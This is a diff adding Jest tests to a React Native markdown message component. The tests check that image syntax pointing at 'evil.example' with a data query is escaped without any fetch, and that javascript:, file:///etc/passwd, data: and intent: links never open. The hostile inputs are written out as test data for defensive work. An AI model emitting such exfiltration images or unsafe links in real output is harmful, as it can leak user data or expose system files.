@@ -57,3 +57,42 @@ describe('MarkdownMessage', () => {
     openURL.mockRestore();
   });
 });
+
+it.each([
+  '![](https://evil.example/?d=x)',
+  '![alt][image]\n\n[image]: https://evil.example/?d=x',
+  '![](https://evil.example/(x))',
+])('never hands image syntax to the native renderer: %s', (text) => {
+  const originalFetch = global.fetch;
+  const request = jest.fn();
+  Object.defineProperty(global, 'fetch', {
+    value: request,
+    configurable: true,
+    writable: true,
+  });
+  const { getByTestId } = render(<MarkdownMessage text={text} />);
+  expect(getByTestId('enriched-markdown').props.children).toContain('\\![');
+  expect(request).not.toHaveBeenCalled();
+  Object.defineProperty(global, 'fetch', {
+    value: originalFetch,
+    configurable: true,
+    writable: true,
+  });
+});
+it.each([
+  'javascript:alert(1)',
+  'file:///etc/passwd',
+  'data:text/html,test',
+  'intent://evil',
+])('refuses unsafe link schemes: %s', (url) => {
+  const open = jest.spyOn(Linking, 'openURL');
+  const { getByTestId } = render(
+    <MarkdownMessage text="[normal](https://example.com)" />
+  );
+  expect(getByTestId('enriched-markdown').props.children).toContain(
+    '[normal](https://example.com)'
+  );
+  fireEvent(getByTestId('enriched-markdown'), 'linkPress', { url });
+  expect(open).not.toHaveBeenCalled();
+  open.mockRestore();
+});
